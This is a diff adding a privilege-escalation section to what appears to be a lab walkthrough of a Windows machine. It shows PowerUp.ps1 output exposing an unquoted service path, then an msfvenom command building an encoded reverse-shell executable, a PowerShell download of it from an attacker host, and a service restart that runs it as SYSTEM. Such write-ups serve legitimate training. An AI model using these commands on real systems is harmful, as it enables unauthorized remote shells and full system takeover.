@@ -66,8 +66,131 @@ Nmap done: 1 IP address (1 host up) scanned in 145.35 seconds
 
 3. Privilege Escalation
   For privilege escalation we are using the common [PowerSploit Repo](5) and PowerUp.ps1 to see what
-  options we have to escalate. First copy over the PowerUp.ps1 script to your current directory. Upload it via your meterpreter shell with `upload PowerUp.ps1`. After it uploads drop into a meterpreter powershell shell with  `load powershell` then she
-4. Sample
+  options we have to escalate. First copy over the PowerUp.ps1 script to your current directory. Upload it via your meterpreter shell with `upload PowerUp.ps1`. After it uploads drop into a meterpreter powershell shell with  `load powershell` then run `powershell_shell` to drop into a PS Metasploit shell. Then load in the PowerUp.ps1 then Invoke-AllChecks like so
+  ```
+  meterpreter > upload PowerUp.ps1
+[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
+[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
+meterpreter > powershell_shell
+
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+
+[*] Checking service executable and argument permissions...
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+[*] Checking service permissions...
+[*] Checking %PATH% for potentially hijackable DLL locations...
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+[*] Checking for modifidable registry autoruns and configs...
+[*] Checking for modifiable schtask files/configs...
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[*] Checking for cached Group Policy Preferences .xml files....
+  ```
+
+  Seeing these result we can look at the services for unquoted service paths.
+  unquoted service paths are where we can replace the service path if it was not put in quotes.
+  To do this we would also have to restart the service which we can also see on services with
+  `CanRestart     : True` on them. We see the Service `AdvancedSystemCareService9` can be restarted and can modify the service path.
+  In that case lets generate reverse_tcp shell with `msfvenom`
+  `msfvenom -p windows/shell/reverse_tcp LHOST=10.8.30.155 LPORT=4556 -e x86/shikata_ga_nai  -f exe > Advanced.exe`
+
+  Then setup an metasploit handler with `use exploit/multi/handler` set your LHOST and LPORT then run the handler in the background with `exploit -j`.
+
+  Back on the original metasploit shell upload the Advanced.exe file to `C:\Program Files (x86)\IObit` so that it can be the first ran. you can do that with powershell using
+  `powershell Invoke-WebRequest -Uri http://10.8.30.155:8000/Advanced.exe -Outfile Advanced.exe`
+
+  After that we restart the service with `sc stop AdvancedSystemCareService9` then `sc start AdvancedSystemCareService9`
 5. Sample
 
 ## Review
